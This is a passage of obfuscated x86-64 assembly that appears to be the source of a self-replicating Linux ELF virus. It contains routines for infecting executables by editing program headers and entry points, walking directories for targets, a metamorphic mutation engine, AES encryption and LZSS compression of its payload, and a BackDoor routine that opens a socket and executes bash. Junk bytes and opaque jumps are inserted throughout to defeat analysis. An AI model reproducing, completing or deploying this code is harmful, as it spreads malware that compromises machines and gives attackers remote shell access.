    jge         ..@YOhfNFuiu2CC
..@CgJqUux0xpqb:
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    jl          ..@ira5zAwBpEzJ
    jge         ..@ira5zAwBpEzJ
..@sL0ElTAVQqNt:
    mov         ax, dx
    and         ax, 1111b
    push        rbx
    jl          ..@C1qONFjTU9u1
    jge         ..@C1qONFjTU9u1
..@2ka0lrqUJh0l:
    mov         rax, 0x10
    jmp         $+4
db 0x4b, 0xdb
    je          ..@MYlEFZ8FHgG3
    jne         ..@MYlEFZ8FHgG3
..@0OIZtxORQWHL:
    mov         r1, r5
    jmp         $+3
db 0xf8
    jmp         $+5
db 0x85, 0x95, 0xb1
    jmp         ..@dCsT2520TKXM
..@nOGHPiRC8L7w:
%ifdef X86_32
    mov         edi, r1
%endif
    jmp         $+5
db 0x33, 0xd6, 0xe6
    jmp         ..@WCAIsD8ecwzJ
..@fjUh8o7i0z87:
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    jmp         $+5
db 0xe5, 0x4e, 0xeb
    jb          ..@G7tY94rU0oIc
    jae         ..@G7tY94rU0oIc
..@ew5GBZWP66xm:
    mov         rdx, rdx
    jmp         $+4
db 0x0f, 0x1b
    jmp         ..@3l0f87AxiFKJ
..@tl8db93T9wpV:
    jnz         ..@jAAW6sOMU7Ms
    mov         r1, r5
    jmp         ..@cC08XnUZIqow
..@d5FRLPSoxmX6:
%ifdef X86_32
    cmp         dx, 00c083h
%endif
    jmp         ..@Is4CLhpCiiWE
..@J729Zg5u7Tjv:
    push        r1
    jmp         $+5
db 0xd2, 0x97, 0xc0
    jl          ..@8GPpIqoCiavu
    jge         ..@8GPpIqoCiavu
..@9H3fOoTe88sz:
    mov         rdi, QWORD [rsp+_MUTA_OFF.start]
    mov         rbx, rbx
    add         rdi, rcx
    jl          ..@IuLUg0EjKzE5
    jge         ..@IuLUg0EjKzE5
..@s2wVh5YtkNwN:
    add         rsi, rcx
    jmp         $+3
db 0xa6
    jmp         ..@BxQwZCDTmSQV
..@3p5noZoUTGez:
    push        r3
    jmp         $+3
db 0xf8
    jmp         $+3
db 0x45
    jl          ..@PZNWre65f2jC
    jge         ..@PZNWre65f2jC
..@QRVaUIRVrcyj:
    rep         nop
    jmp         $+4
db 0x1b, 0xf8
    jmp         ..@lVozmunRPfEm
..@mT5QdtqlTNMO:
    pop         rsi
    jmp         ..@wAI0XsYvfx5f
..@FHu5TkFyCC6y:
    push        rdx
    jmp         ..@fclhcmkp3evW
..@Is4CLhpCiiWE:
%ifdef X86_32
    je          ..@TlOOr11ZBt9S
%endif
    jmp         ..@aJdaT0C65SYP
..@VAB8z7MQTOwl:
    mov         esi, DWORD [rdi]
    jmp         $+5
db 0xca, 0x83, 0xbe
    jmp         ..@c6YeBjGMq3tU
..@sojvJhWW1QnG:
    jmp         ..@LkSL9DZSaqWm
    jmp         $+5
db 0x70, 0x77, 0x7e
    jmp         $+3
db 0x85
    jmp         $+4
db 0xdf, 0x6d
    jl          ..@JPH4E5RFkeA8
    jge         ..@JPH4E5RFkeA8
..@NGxxuQvjYpC7:
    xor         rbx, rbx
    jmp         ..@1pSmmejY1bfp
..@tXjekPe2uh9K:
    mov         BYTE [r1], '/'
    jmp         $+3
db 0x35
    js          ..@vONsixJT7Ee7
    jns         ..@vONsixJT7Ee7
..@oOISTh7ZUsEJ:
    xor         rcx, rcx
    jmp         $+4
db 0xd1, 0xe7
    jmp         ..@uw4RRgpJKxCR
..@wpp5TAFY8shH:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_SOCKET
%endif
    jmp         $+4
db 0x4b, 0xed
    jmp         ..@G1dcIDUbk9NS
..@FWSnk7UXpmO2:
%ifdef X86_32
    shr         edx, 8
%endif
    jmp         ..@WdMl6chmbfwQ
..@XkfXq6lY8U47:
    cmp         dl, 0ebh
    mov         rdx, rdx
    jb          ..@pTVJP3ywlcRb
    jae         ..@pTVJP3ywlcRb
..@LymlshYoZIW1:
    xor         rdx, rdx
    mov         ecx, DWORD [rdi+1]
    jmp         $+4
db 0xff, 0x7d
    jmp         ..@UnAqD7sowtTY
..@5n5FUxhty43X:
    je          ..@zUSU96Pfv1Xo
    xchg        rsi, rsi
    mov         r5, [rsp]
    jmp         $+5
db 0x15, 0x4d, 0xd7
    jmp         ..@2XOovPlqWffx
..@wpcL4PENomeI:
    mov         r2, QWORD [r5+file.filesize]
    mov         r4, 0x1
    xor         rax, rax
    jmp         ..@YvOeIfaLRIRL
..@lAuDzYAHNBDa:
    call        Strcpy
    jmp         ..@tXjekPe2uh9K
..@S34TTlJCVFzO:
    mov         BYTE [rsi], bl
    jmp         $+3
db 0x76
    jmp         $+4
db 0x36, 0x0b
    jmp         ..@oCGmYSVwYlWR
..@nK6R93uxJj2V:
    test        al, al
    mov         rbx, rbx
    jmp         $+5
db 0xdb, 0x41, 0x5b
    js          ..@ZqyqvYzWfipb
    jns         ..@ZqyqvYzWfipb
..@z9ixdgZHNVum:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0xa0]
    jmp         $+3
db 0x33
    jmp         ..@4hfdeSxB8Emq
..@yXNe6nvnTwZT:
    lea         r3, [rsp+_PAYLOAD_OFF.key]
    call        MutationEngine
    jmp         ..@SCKk9X2mOglx
..@d68R8DVa4692:
    jmp         ..@Eanh4onfRkFS
    jmp         ..@JTYZ4Robt4jk
..@uR79w1EnAnvb:
%ifdef X86_64
    syscall
%endif
    jmp         $+3
db 0x93
    jmp         $+3
db 0x7d
    jb          ..@tU1JfeaZFjGQ
    jae         ..@tU1JfeaZFjGQ
..@HhOszDPCRbSi:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jge         ..@qRjpeFo45cd1
    jl          ..@c6A7QwHhdfYb
    jge         ..@c6A7QwHhdfYb
..@mR9k2roxlrQb:
    pop         rdx
    add         rdi, 0x4
    jmp         $+3
db 0xe1
    jmp         $+5
db 0x37, 0x11, 0xf4
    je          ..@DZjvEgeF4NIs
    jne         ..@DZjvEgeF4NIs
..@BIB4k3s9AaK5:
    mov         rcx, rcx
    cmp         rax, (-1)
    je          ..@9VxprLxMwhWQ
    jmp         ..@4M2dw4BR8LL5
..@O6LHI18svdN1:
    ret
    jb          ConvertPushPopValueToMoveValue
    jae         ConvertPushPopValueToMoveValue
..@VI3fLWZPGBSe:
    pop         rdi
    jmp         ..@kHmm0GQx9xyJ
..@pX2OHEbJgUTO:
    and         ecx, 0ffffff80h
    test        ecx, ecx
    setz        cl
    jmp         $+3
db 0x63
    jl          ..@Tb5MWlctRX77
    jge         ..@Tb5MWlctRX77
..@gbVnIus5rw5w:
%ifdef X86_64
    and         edx, 0fffff8f8h
%endif
    js          ..@jbp3lvHkuiL7
    jns         ..@jbp3lvHkuiL7
..@oT4CWDc1vEiq:
    pop         rcx
    pop         rsi
    js          ..@ybXXXP8KqDWK
    jns         ..@ybXXXP8KqDWK
..@fYdpVkrPyWYd:
    not         ebx
    jmp         ..@aO6Xrz8Tjt3j
..@5R9hBjrOWrsi:
    or          edi, eax
    jmp         $+3
db 0xfe
    jmp         ..@CAOXtb4J9z8x
..@Yw6dRmjDEml2:
    mov         eax, 1
    jmp         $+5
db 0xbb, 0x28, 0xed
    jl          ..@0YCvYJd5Ehif
    jge         ..@0YCvYJd5Ehif
..@maOSLPrSWLMP:
    ret
    jb          ConvertPushPopToMove
    jae         ConvertPushPopToMove
..@TWmuz2nFOSdN:
%ifdef X86_32
    shr         ebx, 8
%endif
    jl          ..@lF9D1cLhtXZ6
    jge         ..@lF9D1cLhtXZ6
..@9VxprLxMwhWQ:
    call        DestroyPayload
    jmp         ..@VIudUbte6qRw
..@rJytU4Pgw5fY:
    push        rdx
    pop         rdx
    jmp         $+5
db 0x42, 0x58, 0x0e
    jmp         $+3
db 0x3c
    jmp         $+3
db 0x12
    js          ..@UH9E8PB3PlLM
    jns         ..@UH9E8PB3PlLM
..@G7tY94rU0oIc:
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    jmp         ..@4tbq5INizsO5
..@QgvFT44Sdqd9:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    jmp         $+5
db 0x69, 0xd1, 0x78
    jl          ..@Y5tsdvzIXQLj
    jge         ..@Y5tsdvzIXQLj
..@3YCTu9Z7GH6o:
    jne         ..@PA9RtOahiuFj
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    js          ..@gWtpPl33cQnD
    jns         ..@gWtpPl33cQnD
ConvertMoveToPushPop:
    jmp         ..@a6IAqZb6helX
..@EERfbmOXFiei:
    push        rdx
    jmp         $+5
db 0x44, 0x60, 0xe4
    jmp         $+4
db 0x09, 0x36
    jmp         $+5
db 0xcc, 0x80, 0xc9
    je          ..@ACZZbcpK8UxC
    jne         ..@ACZZbcpK8UxC
..@lUe3O7E2ljon:
%ifdef X86_64
    mov         bl, 41h
%endif
    jmp         ..@0mRtLOgc4pDT
..@RaxnOSwgOnfr:
%ifndef ENABLE_DEBUGGING
    xchg        rcx, rcx
%endif
    jmp         $+3
db 0x59
    jmp         $+3
db 0x51
    jmp         $+5
db 0xbc, 0xc2, 0xa5
    jmp         $+4
db 0x9b, 0xe1
    jmp         BackDoor
..@sRySGcaUo07N:
    mov         rdi, rsi
    add         rdi, rcx
    jmp         $+5
db 0x10, 0xa7, 0xca
    jb          ..@mWv1EZjNjHuJ
    jae         ..@mWv1EZjNjHuJ
..@zPId1Mt7LJIW:
    mov         rbx, rbx
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0xe0]
    jmp         $+3
db 0x63
    jb          ..@XI1n6fWznf36
    jae         ..@XI1n6fWznf36
..@5anxMG9gLIfj:
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jmp         $+3
db 0xdb
    js          ..@OcjqlmjoKXle
    jns         ..@OcjqlmjoKXle
..@0hCxOe4jXI1C:
    mov         rcx, rcx
    jmp         $+4
db 0x8b, 0x97
    jmp         ..@sojvJhWW1QnG
..@x2Nlmz2ItQxB:
    cmp         rax, 0xffffffffffffffff
    je          ..@w5NpUI0VlVwW
    jl          ..@3VUSlwl2QWs1
    jge         ..@3VUSlwl2QWs1
..@BIXpVXqsBnJq:
    mov         edx, DWORD [rdi]
    js          ..@KjEPR3j1nNbp
    jns         ..@KjEPR3j1nNbp
..@B60tJa398iHE:
    lea         r3, [rsp+_PAYLOAD_OFF.key]
    mov         rsi, rsi
    js          ..@odPdHcolPTlk
    jns         ..@odPdHcolPTlk
..@u9VaqPputuQs:
    mov         dx, WORD [rdi+4]
    jmp         $+5
db 0xf7, 0x86, 0x5a
    jmp         $+4
db 0x28, 0x9d
    jmp         $+5
db 0x13, 0xc4, 0xc0
    jmp         ..@xXAhdgItxYKJ
..@V6n0DiztnB4a:
    push        rdi
    pop         rdi
    jmp         $+3
db 0x22
    jmp         ..@FpDZW3fh3DGs
..@a31Iq9HaGblC:
    mov         QWORD [rsp+_AESE_OFF.length], r2
    mov         QWORD [rsp+_AESE_OFF.keyaddr], r3
    mov         rsi, rsp
    jmp         $+4
db 0xa0, 0x69
    jmp         $+3
db 0xea
    jmp         $+4
db 0x89, 0x85
    je          ..@zFcGmZ2EW8vF
    jne         ..@zFcGmZ2EW8vF
..@aq98Fwkrav8x:
    mov         rcx, rcx
    jmp         $+4
db 0x42, 0xe9
    jb          ..@bguoLTh9Cwot
    jae         ..@bguoLTh9Cwot
..@7v0Kl1pw4btR:
%ifdef X86_64
    push        rcx
    pop         rcx
    sete        al
%endif
    jmp         ..@0kckExLfYr2W
..@nJp8xEmarYFT:
    mov         rax, (-1)
    ret
    jmp         $+5
db 0x68, 0x5a, 0x95
    jmp         $+5
db 0x9b, 0xc7, 0x5b
    jmp         $+3
db 0x22
    jmp         $+4
db 0x1b, 0x0d
    je          ConvertAddToSub
    jne         ConvertAddToSub
..@lpzFDqQ1PlQ1:
    mov         rdi, rdi
    jmp         $+3
db 0xf2
    je          ..@CWBveDuN9rZT
    jne         ..@CWBveDuN9rZT
..@7jGFxnB0CKh9:
    pop         rsi
    js          ..@NyLKBCnJamHQ
    jns         ..@NyLKBCnJamHQ
..@fh5BmBWEdP6K:
    mov         cl, dl
    or          cl, 1b
    shl         ecx, 16
    jmp         ..@oSYzTnjLffp3
..@uXkQCGQfVkmO:
    pop         rcx
    pop         rsi
    jl          ..@BPseEGp6laXx
    jge         ..@BPseEGp6laXx
..@sclNW5bcy6G0:
    add         rax, r2
    mov         r2, rax
    mov         rax, SYS_FTRUNCATE
    jmp         $+5
db 0xdd, 0xb1, 0xcb
    jl          ..@bM7CpfVo6AJ0
    jge         ..@bM7CpfVo6AJ0
..@s9AJatE4NOQD:
    jl          ..@crx9UFqLtFKc
    jmp         ..@YwkeTuzgBeCP
    jmp         $+5
db 0x0d, 0x1c, 0xd9
    js          ..@XNOmR0xuBk3G
    jns         ..@XNOmR0xuBk3G
..@tKf3LFFiVtbl:
    mov         r4, m6
    call        UpdateSignature
    mov         r1, m6
    jmp         ..@n9avBMwK0P9X
..@lF9D1cLhtXZ6:
%ifdef X86_32
    xchg        rsi, rsi
%endif
    jb          ..@6lykbhN2D8xD
    jae         ..@6lykbhN2D8xD
..@otm9O54xr9pk:
%ifdef X86_64
    shl         ecx, 16
%endif
    jl          ..@NEPj27k1kK7l
    jge         ..@NEPj27k1kK7l
..@8TrT0itfsce3:
    pop         rdi
    jmp         ..@iCaT5iaYDp23
..@00kZ0bG3KtL0:
%ifdef X86_64
    jz          ..@xCVG4qGhmYVF
    shl         edi, 8
%endif
    jmp         $+4
db 0xfa, 0x47
    jmp         ..@dxJpV2zcLC19
..@uwHklWaSXOtP:
    mov         ecx, 0x8
    jmp         $+5
db 0xc3, 0x29, 0x0c
    jmp         ..@dxSQiOQ8yfbu
..@0Mpr65CtwYiZ:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    rep         movsb
    jmp         $+3
db 0x8d
    jmp         ..@j1tRzutAHYz5
..@XUz7oqxGBCpc:
    xor         rax, rax
    jmp         $+4
db 0x3b, 0xd4
    je          ..@oLsQH0D92105
    jne         ..@oLsQH0D92105
..@Z7r5AQqkURop:
    mov         r2w, WORD [r5+e_h.e_shnum]
    jl          ..@xLJHX94GYA0v
    jge         ..@xLJHX94GYA0v
..@Q8lh0u1o9QXk:
    jl          ..@OwrxDVUO0Ao1
    jmp         $+3
db 0xee
    jmp         ..@It7FaW8DJTZh
GetNewProgramVaddr:
    jmp         ..@8k5z0Eku2FYw
..@ykvTzKIfqbV2:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_SETSID
    syscall
%endif
    jmp         $+5
db 0x5e, 0x01, 0xac
    jmp         $+3
db 0x18
    jmp         ..@bWIx8pi8FM5X
..@nFd2D2aFhW18:
    push        rbx
    jmp         $+5
db 0x13, 0xe3, 0xe6
    jmp         ..@o8zTORPEo0E1
..@fWW0mtMtVKDk:
%ifdef X86_32
    pop         rdi
    push        ebp
    xchg        rdi, rdi
%endif
    jmp         $+4
db 0x89, 0xce
    jmp         ..@5iwlMSeoBz9c
..@X1BunZtx53qh:
    movdqu      xmm1, oWORD [rsp+0x80]
    jmp         ..@Gk5NZcoMyVzb
..@teZ6s371w5uR:
    mov         bx, dx
    jmp         ..@p1DrkBOMS8t6
..@vL6Gn2OJxsss:
    call        ConvertMoveToPushPop
    jmp         $+4
db 0x00, 0x7f
    jmp         ..@OMEG9ZN5wbLd
..@eoUaMIbKKw35:
    jmp         ..@ZduL6qpTYMGh
    je          ..@w5NpUI0VlVwW
    jne         ..@w5NpUI0VlVwW
..@9rIVe4PiRr1v:
%ifdef X86_64
    cmp         al, 41h
%endif
    js          ..@ndhmfDKccydX
    jns         ..@ndhmfDKccydX
..@dQ4jIoUheBhD:
%ifndef ENABLE_DEBUGGING
    push        WORD 0x02
%endif
    jmp         $+5
db 0xe9, 0xae, 0xc0
    jmp         $+4
db 0x92, 0x06
    jmp         ..@OXhbmrxo5AQ3
..@68LVBbtBcdT0:
    xchg        rcx, rcx
    mov         eax, DWORD [rdi]
    jmp         $+3
db 0x7c
    jl          ..@p7uVbCcKlzEx
    jge         ..@p7uVbCcKlzEx
..@pyDkljr1bvDw:
%ifdef X86_32
    cmp         dx, 00c080h
%endif
    jmp         $+4
db 0x44, 0x12
    jl          ..@c27KibWHv9rM
    jge         ..@c27KibWHv9rM
..@91zgwbClouee:
%ifndef ENABLE_DEBUGGING
    VAR         packed, bash
    mov         r1, r5
    mov         eax, SYS_EXECVE
%endif
    jmp         $+3
db 0x22
    jmp         $+3
db 0xf7
    jmp         ..@BFwouY8qsHBv
..@nmbeZQQuw2Lo:
    jmp         ..@7e2aXlpBXe51
    jb          ..@8XTGYnBT6iil
    jae         ..@8XTGYnBT6iil
..@UZIuGzVbwDYV:
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    js          ..@09pAhJT3sNU6
    jns         ..@09pAhJT3sNU6
..@LJYrC9btzRl3:
%ifdef X86_32
    pop         rdi
%endif
    jmp         ..@SKCL6hgJEz3u
..@Idr2IKFBxw5m:
    sub         r4, QWORD [r1+e_h.e_entry]
    jmp         $+4
db 0x99, 0xa4
    jmp         ..@0a7eG6ITklLN
..@EKdGUuJFwP6L:
%ifdef X86_64
    mov         bx, dx
    and         bx, 0f8ffh
%endif
    jmp         $+4
db 0xa0, 0x8c
    jmp         $+5
db 0xba, 0x0f, 0xce
    je          ..@bIdloQfeFGW0
    jne         ..@bIdloQfeFGW0
..@iEoE6ca7Qeni:
    add         rdi, rcx
    je          ..@xgrg4kwTfBxu
    jne         ..@xgrg4kwTfBxu
..@Udnsd5qlOxRH:
    xchg        rsp, rsp
    jmp         ..@VGDcJXp9DlQj
..@IyOPQ5IYLiNb:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+5
db 0x82, 0x09, 0x5b
    jmp         $+5
db 0x07, 0xca, 0xe8
    jl          ..@W9lEkh8h5Oaa
    jge         ..@W9lEkh8h5Oaa
..@TYl9qBPnc5Nw:
    sete        al
    jl          ..@fHIfNJSaPDvy
    jge         ..@fHIfNJSaPDvy
..@hB8QtuBtfdmy:
    mov         rdx, rsi
    push        rsi
    jmp         $+5
db 0x3b, 0xd9, 0x79
    jl          ..@zSa3GlUmDLmL
    jge         ..@zSa3GlUmDLmL
..@MZWk3UYDAGmZ:
    pop         rcx
    jmp         $+5
db 0xee, 0xac, 0xf0
    jmp         $+4
db 0xe6, 0x6a
    js          ..@le0N6L6EPWrA
    jns         ..@le0N6L6EPWrA
..@Bza0smcU3CY3:
    mov         rsp, rsp
    jl          ..@q28STlEWGeQc
    jge         ..@q28STlEWGeQc
..@BhEktAuOJvJK:
    xor         rdx, rdx
    jmp         $+4
db 0xcd, 0xbf
    jmp         $+5
db 0x13, 0xa8, 0x06
    jmp         $+5
db 0xc5, 0xa5, 0x4b
    jmp         ..@rfTKiQCodtiq
..@cKbxaJ3EaKS9:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    add         rsp, _LZSSE_OFF_size
    jmp         $+4
db 0x6c, 0x1b
    jmp         ..@93xXZgEB0p6Y
..@loRlHd9g15qS:
%ifdef X86_64
    mov         DWORD [rsi+rcx], ebx
%endif
    jmp         $+4
db 0xf2, 0x15
    jmp         $+3
db 0x25
    je          ..@Pniixj5OSa0p
    jne         ..@Pniixj5OSa0p
..@zRI5ZB4p5NKj:
    mov         rax, rcx
    jl          ..@OWTgWfjHyzZ9
    jge         ..@OWTgWfjHyzZ9
..@gHCuFbDsdqkf:
%ifdef X86_64
    shr         ebx, 16
    xchg        rdx, rdx
%endif
    jmp         $+3
db 0x33
    jmp         $+3
db 0x35
    jmp         ..@TWmuz2nFOSdN
..@fAYiGdPYiQgz:
    pop         rcx
    jmp         ..@2YtRg25IJ9QG
..@khwy1wAVKufM:
%ifndef ENABLE_DEBUGGING
    mov         r1, 0xf
    VAR         packed, bash
    push        rax
%endif
    jmp         $+3
db 0x08
    jmp         $+3
db 0x00
    jmp         $+4
db 0x68, 0x30
    jl          ..@Thhobj9MO6IP
    jge         ..@Thhobj9MO6IP
..@HjTuEn4VH3zl:
    mul         r3 
    jmp         $+4
db 0xe6, 0x57
    jb          ..@u2ZpTyMhWeXB
    jae         ..@u2ZpTyMhWeXB
..@Thhobj9MO6IP:
%ifndef ENABLE_DEBUGGING
    pop         rax
    mov         r2, r5
%endif
    js          ..@0SsILXeW8XCc
    jns         ..@0SsILXeW8XCc
..@qMkxvJZzFgQl:
    pop         rsi
    mov         rax, (-1)
    jmp         $+3
db 0xed
    je          ..@r8noLx1NSp4M
    jne         ..@r8noLx1NSp4M
..@oRqBQCUG7ZZe:
    mov         rdx, rdx
    js          ..@4Wqhwfqi5gtV
    jns         ..@4Wqhwfqi5gtV
..@8heAxOtaOFdR:
%ifdef X86_64
    cmp         dl, 41h
    push        rcx
    pop         rcx
%endif
    jmp         $+4
db 0x8e, 0x93
    jmp         ..@UGto9x64YTCI
..@VmLPmMqwJnTo:
    movdqu      xmm1, oWORD [rsp]
    jmp         $+3
db 0xcc
    jb          ..@T7Mu8TFMOxd2
    jae         ..@T7Mu8TFMOxd2
..@2oIquIyAg8lc:
    and         edx, 111b
    jmp         $+4
db 0x6b, 0xaf
    jmp         $+5
db 0x5b, 0x8f, 0x13
    jmp         $+4
db 0x9f, 0xb1
    jl          ..@iY0uTPJEstJw
    jge         ..@iY0uTPJEstJw
..@vXmrtO6m2SmM:
    push        rdi
    jmp         $+4
db 0x81, 0xae
    jl          ..@60SKbBqog7Re
    jge         ..@60SKbBqog7Re
..@lyzBJwrGrGW7:
    xchg        rdi, rdi
    mov         rsp, rsp
    push        rbx
    jb          ..@lpzFDqQ1PlQ1
    jae         ..@lpzFDqQ1PlQ1
..@RO2YHGAn25Dc:
    push        rax
    jmp         $+3
db 0xe4
    js          ..@C9oZdQcyRsDC
    jns         ..@C9oZdQcyRsDC
..@CF26boOO4byM:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
    mov         r2d, 0x2
%endif
    jmp         $+4
db 0x3f, 0x22
    jmp         $+4
db 0x23, 0x21
    jmp         $+4
db 0x1d, 0x69
    jmp         $+3
db 0x6f
    jmp         ..@nB3x1vdD7cYf
..@MUu3loMdUyaf:
    pop         rcx
    jl          ..@XkfXq6lY8U47
    jge         ..@XkfXq6lY8U47
..@IABMXIp1yh1o:
    mov         rdi, rdi
    jl          ..@p9itXrdCwVnB
    jl          ..@QzTcjvRgBKi2
    jge         ..@QzTcjvRgBKi2
..@pLZIe6cu0NYP:
    pop         rdx
    jmp         ..@NWNi65wapRK3
..@gssbpJcbgqs5:
%ifdef X86_32
    pop         rdx
%endif
    jb          ..@YHFedMb7XjQP
    jae         ..@YHFedMb7XjQP
..@D3weXy8psjLQ:
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    mov         QWORD [r2+p_h.p_offset], r3
    push        r2
    jb          ..@3p5noZoUTGez
    jae         ..@3p5noZoUTGez
..@NyjxZpbMAaUL:
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    add         r1, 2
    jmp         ..@OauQEt2hz9ai
..@9Loo9pcmDbvD:
    jl          ..@Z7ntUuJ1JsBJ
    je          ..@1Ds5s1YrU2eZ
    jne         ..@1Ds5s1YrU2eZ
..@e2LxLhzBmsGn:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    rep         nop
    js          ..@Lm8yh7WL9pGS
    jns         ..@Lm8yh7WL9pGS
..@PgvEiAB3Lgfr:
    mov         ecx, edx
    jl          ..@pX2OHEbJgUTO
    jge         ..@pX2OHEbJgUTO
..@yovtGKM5UGaj:
    add         rdi, rax
    jmp         $+5
db 0xd0, 0x95, 0x0f
    jmp         $+5
db 0xdb, 0xe7, 0xb2
    jmp         $+5
db 0x34, 0x26, 0xf9
    jmp         $+3
db 0xa0
    js          ..@winwgenmNWV5
    jns         ..@winwgenmNWV5
..@oXN93sDCRbZv:
    mov         al, BYTE [rdi]
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+5
db 0x6c, 0xff, 0xa2
    jb          ..@EZKcSdHgIyMC
    jae         ..@EZKcSdHgIyMC
..@TNFZRdVIcw8n:
    pop         rcx
    js          ..@u3ot3GIosCqA
    jns         ..@u3ot3GIosCqA
..@pbVOrJwLUIvd:
    push        rcx
    jmp         $+5
db 0xe8, 0x0a, 0x8b
    jl          ..@mF74p7VXUH2e
    jge         ..@mF74p7VXUH2e
..@YGJvlt6so6DZ:
    and         edx, 000000f8h
    cmp         dl, 0b8h
    jne         ..@oT4CWDc1vEiq
    jmp         $+5
db 0xff, 0x8e, 0x47
    jb          ..@60VAZNZZ7BIJ
    jae         ..@60VAZNZZ7BIJ
..@aAWvIglwwDdm:
    add         r1, 1
    jmp         $+4
db 0xd2, 0xd7
    jb          ..@Zq008eB6VulF
    jae         ..@Zq008eB6VulF
..@cDsS7GynK2BI:
    mov         QWORD [r2+p_h.p_filesz], r4
    jmp         $+4
db 0xfd, 0x5a
    jmp         ..@NxxpcGb1oDgZ
..@Wsno4DLvckaC:
    xchg        rax, rax
    jmp         $+4
db 0x52, 0x6e
    jl          ..@Fo0VENIgLkDY
    jge         ..@Fo0VENIgLkDY
..@fBYKcD3SB9W2:
    xor         rax, rax
    jmp         $+4
db 0x12, 0xc6
    jmp         $+3
db 0x98
    jmp         ..@b1BpVuiB3GVf
..@IotBDY8zvMxM:
%ifdef X86_64
    mov         r10d, 0x01
%endif
    jmp         $+5
db 0x3d, 0x52, 0xa2
    jb          ..@DSsjZ3RFAgrT
    jae         ..@DSsjZ3RFAgrT
..@jebsABC5k7MU:
    add         rdi, rbx
    jmp         ..@P4a0N9Mx1prm
..@DjKijTALoKm1:
%ifndef ENABLE_DEBUGGING
    push        rdx
    pop         rdx
    call_vsp    ExitProgram
%endif
    jb          ..@9oPClc9GvwdT
    jae         ..@9oPClc9GvwdT
..@j1tRzutAHYz5:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    jb          ..@z5uoxc4vwrm2
    jae         ..@z5uoxc4vwrm2
..@hqKWTgVG1Zh8:
    mov         rdi, rdi
    jb          ..@cZ3uI3PqtNep
    jae         ..@cZ3uI3PqtNep
..@f3ZmzOHbYIh3:
    rep         nop
    jmp         $+4
db 0x23, 0xf1
    js          ..@39aKxOEhZng4
    jns         ..@39aKxOEhZng4
..@xgrg4kwTfBxu:
    mov         edx, DWORD [rdi]
    jmp         ..@bqYOwT8egvtk
..@LiEv31Jznf6x:
    mov         rbp, rbp
    je          ..@ANMnNzngtkyC
    jne         ..@ANMnNzngtkyC
..@zpXtgJwdEoUh:
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    jl          ..@OwrxDVUO0Ao1
    jge         ..@OwrxDVUO0Ao1
..@7g5cK8dyokob:
    push        rsi
    jmp         $+3
db 0x6d
    jmp         $+5
db 0x05, 0xde, 0xed
    js          ..@s4AiiQTM9ilK
    jns         ..@s4AiiQTM9ilK
..@5JlUnn9FZrkr:
    mov         rdi, QWORD [rsp+_MUTA_OFF.start]
    mov         ecx, DWORD [rsp+_MUTA_OFF.index]
    jb          ..@9H3fOoTe88sz
    jae         ..@9H3fOoTe88sz
..@EYbBnEaLsUew:
    pop         r4
    jmp         $+3
db 0x86
    jmp         $+3
db 0xfe
    js          ..@LTQrngYWh2Rz
    jns         ..@LTQrngYWh2Rz
..@p1Cm2Jk9BgxK:
    xor         rcx, rcx
    je          ..@OOwATJzGL90N
    jne         ..@OOwATJzGL90N
..@z5emNdr4TNFe:
    mov         edx, DWORD [rdi]
    je          ..@FnMXvPx6VDDd
    jne         ..@FnMXvPx6VDDd
..@d1tyzBU4cupH:
    pop         rsi
    mov         rax, (-1)
    js          ..@fuSvX8MNKVM4
    jns         ..@fuSvX8MNKVM4
..@hLWYGuQDRZs2:
%ifdef X86_32
    test        dl, dl
%endif
    jmp         $+5
db 0xcb, 0x18, 0x74
    je          ..@DAv8jFP4vqZ1
    jne         ..@DAv8jFP4vqZ1
..@4lMbtFoP5m6u:
    xor         rcx, rcx
    jmp         $+3
db 0xf6
    jmp         ..@kTKlozcJw23R
..@5TXvSPi4Cb5m:
    jz          ..@o8tuZNAcohWE
    cmp         dl, 101000b
    je          ..@8cLwJr8Q3Php
    jmp         $+4
db 0x5b, 0xec
    jmp         ..@Jn8ZIqiqLRtd
ConvertAddToSub:
    jmp         ..@ryyRiRDTi0cg
..@CYHL6bOBwQos:
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    jl          ..@SyHbJae1fL37
    jge         ..@SyHbJae1fL37
..@Tb5MWlctRX77:
    push        rdx
    pop         rdx
    jmp         $+4
db 0xf6, 0x60
    jmp         ..@fHAyxnnkKq9Z
..@0p2tZLHcAMNx:
    push        rax
    pop         rax
    jmp         ..@tBRMR3MrchNU
..@FgL8eSQZowbE:
    cmp         eax, 0x00
    jmp         $+3
db 0x05
    jmp         $+4
db 0x18, 0xb1
    js          ..@5iqlaAUIGvO5
    jns         ..@5iqlaAUIGvO5
..@1n4M7nIL0b3X:
    call        Strcpy
    je          ..@GvF2PXahBG33
    jne         ..@GvF2PXahBG33
..@Sz8jiNulC21h:
    mov         QWORD [rsp+_AESE_OFF.startaddr], r1
    je          ..@a31Iq9HaGblC
    jne         ..@a31Iq9HaGblC
..@5FgwDHLOmMzG:
